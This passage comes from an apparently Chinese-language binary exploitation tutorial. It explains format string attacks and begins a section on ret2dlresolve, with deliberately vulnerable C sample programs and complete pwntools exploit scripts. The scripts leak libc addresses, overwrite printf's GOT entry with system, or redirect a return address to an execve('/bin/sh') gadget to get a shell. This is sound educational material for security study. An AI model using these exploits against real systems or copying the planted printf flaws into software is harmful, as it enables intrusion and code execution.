个参数，</span></span><br><span class="line"><span class="string">    那么字符串开头的偏移为 %6$p,</span></span><br><span class="line"><span class="string">    因为main函数的栈占用 0x110 字节，</span></span><br><span class="line"><span class="string">    再加上 push rbp ，所占用的 8 字节，</span></span><br><span class="line"><span class="string">    格式化的字符串开头到 __libc_start_main 之间 0x118 字节的数据，</span></span><br><span class="line"><span class="string">    所以 __libc_start_main 函数地址的偏移就为 0x118/8+6=41 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_got))</span><br><span class="line">p.sendline(<span class="string">&#x27;%41$p&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.read(),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">213</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">data=p64(system)</span><br><span class="line">fs=&#123;&#125;</span><br><span class="line">n=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">i=<span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> i&gt;-<span class="number">1</span>:</span><br><span class="line">    fs[i]=<span class="built_in">ord</span>(data[i])</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*i+p64(printf_got+i)[:-<span class="number">1</span>]</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    i=i-<span class="number">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    构造栈，使栈中存有 printf.got~printf.got+7 这八个地址</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n.sort(key=<span class="keyword">lambda</span> d:fs[d])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">8</span>:</span><br><span class="line">    <span class="keyword">if</span> fs[n[i]]==<span class="number">0</span>:</span><br><span class="line">        payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> fs[n[i]]-fs[n[i-<span class="number">1</span>]]==<span class="number">0</span>:</span><br><span class="line">            payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(fs[n[i]]-fs[n[i-<span class="number">1</span>]])+<span class="string">&#x27;c%&#x27;</span>+<span class="built_in">str</span>(<span class="number">18</span>+n[i])+<span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这里是按照 system函数地址中每个字节所表示的数值，从小到大排列，防止修改时互相干扰</span></span><br><span class="line"><span class="string">    一般格式化字符串修改的数据宽度尽量要小，</span></span><br><span class="line"><span class="string">    因为数据宽度越大，表示在此之前输出的长度越长，</span></span><br><span class="line"><span class="string">    可能会导致将payload发送到靶机之后，</span></span><br><span class="line"><span class="string">    本地窗口一直在获取靶机中输出的内容，</span></span><br><span class="line"><span class="string">    这种情况非常浪费时间</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="非栈中格式化字符串"><a href="#非栈中格式化字符串" class="headerlink" title="非栈中格式化字符串"></a>非栈中格式化字符串</h2><blockquote>
+<p>堆中的格式化字符串比较麻烦<br>需要的条件为栈中存在 a 指向 b ，且b只有低四字节与a不同，<br>这时可以通过a修改b，然后利用b，在栈中创建一个指向某个区域的地址，<br>以此来达到任意地址读写</p>
+</blockquote>
+<p>一般存在两次函数调用操作时可以达到条件如 函数a调用函数b;函数b调用函数c<br>但 __libc_start_main 调用main,main调用某个函数除外，<br>因为__libc_start_main到main函数时储存在栈中的rbp&#x2F;ebp为0，无法组成链表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *b)</span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%40s&quot;</span>,b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(b,<span class="string">&quot;exit&quot;</span>,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nonono\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *b=(<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x40</span>);;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (vuln(b)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input username:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%20s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;s password:&quot;</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>main函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p>main函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p>func函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p>func函数栈布局<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-4.jpg"></p>
+</blockquote>
+<blockquote>
+<p>vuln函数代码<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1-5.jpg"></p>
+</blockquote>
+<blockquote>
+<p>泄露栈中数据<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-format1.jpg"><br>先通过多个 %p 泄露栈中的数据，用来查找可以利用的地址</p>
+</blockquote>
+<p>这个样例符合条件，其中<code>main</code>函数调用<code>func</code>函数,<code>func</code>函数调用<code>vuln</code>函数<br>这样在栈中 至少保存了<code>main</code>函数的<code>rbp</code>与<code>func</code>函数的<code>rbp</code><br>而<code>func</code>函数的<code>rbp</code>指向的地址储存的是<code>main</code>函数的<code>rbp</code>的值<br>刚好形成一个链表</p>
+<p>在这个样例中，因为可以利用栈达到任意地址读写，做法也就多种多样了<br>这里演示了控制返回地址为<code>gadget</code>获取<code>shell</code>，还可以通过设置<code>got表</code>调用<code>system</code>函数</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    因为是在栈中，可以控制函数的返回地址</span></span><br><span class="line"><span class="string">    这个攻击代码中，设置main函数返回地址为 libc中调用execve(&quot;/bin/sh&quot;)的代码地址</span></span><br><span class="line"><span class="string">    还要把储存__libc_start_main函数rbp指针的位置写入新的rbp</span></span><br><span class="line"><span class="string">    而且这个rbp一定要大于 rsp且处于可写地址,否则会导致程序报错中断</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> gadget <span class="keyword">in</span> [<span class="number">0xde78c</span>,<span class="number">0xde78f</span>,<span class="number">0xde792</span>]:</span><br><span class="line">    libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">    p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">    libc_ind=<span class="number">13</span></span><br><span class="line">    p.read()</span><br><span class="line">    p.sendline(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(libc_ind)+<span class="string">&#x27;$p&#x27;</span>)</span><br><span class="line">    c=<span class="built_in">int</span>(p.readuntil(<span class="string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line">    libc.address=c-<span class="number">213</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    sind=<span class="number">8</span></span><br><span class="line">    eind=<span class="number">12</span></span><br><span class="line">    p.readuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(sind,eind))</span><br><span class="line">    data=p.read()[:-<span class="number">7</span>].split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    s1=<span class="built_in">int</span>(data[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">    s2=<span class="built_in">int</span>(data[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(s1),<span class="built_in">hex</span>(s2))</span><br><span class="line"></span><br><span class="line">    ori=s2&amp;<span class="number">0xff</span></span><br><span class="line">    ret=ori</span><br><span class="line">    one_gadget=p64(libc.address+gadget)</span><br><span class="line">    data=p64(s1+<span class="number">0x200</span>)+one_gadget</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address+gadget))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="number">16</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ret+i,sind)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(data[i])==<span class="number">0</span>:</span><br><span class="line">            payload=<span class="string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(eind)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(data[i]),eind)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ori,sind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    因为 printf 函数与 system 函数属于同一个 libc，所以两个函数的真实地址也相近，</span></span><br><span class="line"><span class="string">    想要将printf改成system 函数，只需要修改低两个字节，</span></span><br><span class="line"><span class="string">    所以我们将 printf.got 与 printf.got+2 写入栈中</span></span><br><span class="line"><span class="string">    然后再 将 printf.got 中储存的低四字节替换为 system函数地址 的低四字节</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn_format&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn_format&#x27;</span>)</span><br><span class="line">libc_ind=<span class="number">13</span></span><br><span class="line">p.read()</span><br><span class="line">p.sendline(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(libc_ind)+<span class="string">&#x27;$p&#x27;</span>)</span><br><span class="line">c=<span class="built_in">int</span>(p.readuntil(<span class="string">&#x27;\&#x27;s&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line">libc.address=c-<span class="number">213</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">printf_got=e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sind=<span class="number">8</span></span><br><span class="line">eind=<span class="number">12</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;password:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%&#123;&#125;$p.%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(sind,eind))</span><br><span class="line">data=p.read()[:-<span class="number">7</span>].split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">s1=<span class="built_in">int</span>(data[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">s2=<span class="built_in">int</span>(data[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(s1),<span class="built_in">hex</span>(s2))</span><br><span class="line"></span><br><span class="line">ori=s2&amp;<span class="number">0xff</span></span><br><span class="line">ret=ori</span><br><span class="line">data=p64(printf_got)+p64(printf_got+<span class="number">2</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">16</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ret+i,sind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(data[i])==<span class="number">0</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(eind)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(data[i]),eind)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hhn&#x27;</span>.<span class="built_in">format</span>(ori,sind)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">e=&#123;<span class="number">0</span>:system&amp;<span class="number">0xffff</span>,<span class="number">1</span>:((system&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>)&#125;</span><br><span class="line">n=[<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line">n.sort(key=<span class="keyword">lambda</span> d:e[d])</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(e[n[<span class="number">0</span>]],<span class="number">20</span>+n[<span class="number">0</span>],e[n[<span class="number">1</span>]]-e[n[<span class="number">0</span>]],<span class="number">20</span>+n[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>是利用elf文件的延迟绑定技术<code>_dl_runtime_resolve</code>，达到攻击目的的一种技术<br>程序在执行时，程序<code>link_map</code>结构体的地址位于<code>got表</code>的第二项，<code>_dl_runtime_resolve</code>函数地址位于<code>got表</code>的第三项</p>
+<blockquote>
+<p>函数第一次调用前<br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve.jpg"><br>在使用<code>_dl_runtime_resolve</code>导出函数时，会设置函数在<code>got表</code>中对应的项为函数真实地址<br>如果程序开启了<code>PIE</code>保护，那么会在加载程序的阶段，会将<code>got表</code>中对应函数的真实地址填入</p>
+</blockquote>
+<p><code>_dl_runtime_resolve</code> 在<code>sysdeps/架构/dl-trampoline.h</code>文件中，是一段汇编代码，通过栈传入两个参数，第一个参数是当前程序的<code>link_map结构体的地址</code>，第二个参数是函数在<code>.rel.plt表中的索引值</code>，函数首先保存寄存器的值，然后调用<code>_dl_fixup</code>函数，最后还原寄存器，并执行函数</p>
+<p><code>_dl_fixup</code>在<code>elf/dl-runtime.c</code>文件中，传入两个参数,参数与<code>_dl_runtime_resolve</code>的参数相同，函数先通过<code>link_map</code>获取程序中各种段的地址，经过各种检测后，通过<code>_dl_lookup_symbol_x</code>从<code>link_map.l_scope</code>中搜索符号，并返回符号地址，再经过各种检测后，如果未开启绑定，就直接返回符号地址，否则执行<code>elf_machine_fixup_plt</code>函数，设置<code>got表</code>中的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取各种段的地址</span></span><br><span class="line"><span class="comment">    这些段的地址不是直接储存在 l_info中，而是储存在程序的 dynamic段中 */</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">// 获取 dnysym 表地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">    <span class="comment">// 获取 dnystr 表地址</span></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 获取函数在 rel.plt 中对应成员的地址</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 获取函数在 dynsym 中对应成员的地址</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">// 获取函数在 got 中对应成员的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用_dl_lookup_symbol_x */</span></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// strtab+sym-&gt;st_name 获取符号名称</span></span><br></pre></td></tr></table></figure>
+
+<p><code>_dl_lookup_symbol_x</code>在<code>elf/dl-lookup.c</code>文件中，传入7个参数，分别是 <code>符号名称</code>，<code>link_map</code>，<code>符号在dnysym中对应成员的地址</code>，<code>link_map引用的符号表</code>(里面是保存了用于引用的<code>link_map结构体</code>信息)，<code>版本</code>，<code>符号类型</code>，<code>符号版本信息</code>，<code>跳过的link_map</code>(不查找这个文件中的符号) ，遍历<code>scope</code>中的结构体，排除跳过的<code>link_map</code>，使用 <code>do_lookup_x</code> 从剩余的<code>link_map</code>中搜索符号，当搜索到符号时，返回结构体<code>&#123;符号地址,当前link_map&#125;</code></p>
+<p><code>do_lookup_x</code>在<code>elf/dl-lookup.c</code>文件中，传入13个参数，主要流程为，循环遍历当前<code>link_map</code>表示的文件及其引用的文件中的符号，通过遍历对比文件中的符号名称与传入<code>_dl_lookup_symbol_x</code>的符号名称，来搜索符号，当搜索到符号时，返回 <code>&#123;符号地址,符号所属link_map&#125;</code></p>
+<h2 id="修改dynamic"><a href="#修改dynamic" class="headerlink" title="修改dynamic"></a>修改dynamic</h2><blockquote>
+<p>从 <code>_dl_fixup</code> 中的代码中可以看出，程序获取段地址与 符号在表中的地址，都是通过<code>dynamic段</code>中的数据<br>我们可以修改 <code>dynamic段</code>中的 <code>DT_STRTAB</code> 的值为我们伪造的地址<br>在调用<code>got表</code>中未执行过的函数时，使其通过<code>DT_STARTAB</code>获取到符号名称为我们需要的函数<br>在执行<code>_dl_runtime_resolve</code>时就会自动执行我们需要的函数，并将<code>got表</code>中对应的项设置为我们需要的函数<br>这种利用方法需要程序关闭了 <code>ROLRO保护</code>，否则<code>.dynamic</code> 段不可写，也就无法达到攻击的效果了</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 样例代码 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> cache[<span class="number">0x30</span>]=&#123;&#125;;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="type">int</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> c[<span class="number">0x40</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>,cache,<span class="number">0x50</span>);</span><br><span class="line">    c[read(<span class="number">0</span>,c,<span class="number">0x10</span>)<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *a=atoi(c);</span><br><span class="line">    c[read(<span class="number">0</span>,c,<span class="number">0x10</span>)<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">    *a=atoi(c);</span><br><span class="line">    <span class="built_in">exit</span>(state);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*编译命令</span></span><br><span class="line"><span class="comment">    gcc -z norelro -no-pie pwn_resolve.c -o pwn_resolve</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>main函数代码</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-1.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>bss段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-2.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>dynamic段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-3.jpg"></p>
+</blockquote>
+<blockquote>
+<p><strong>dynstr段布局</strong><br><img src="https://raw.githubusercontent.com/rot-will/Blot-s-pic/main/pwn-%E6%A0%88-resolve-4.jpg"></p>
+</blockquote>
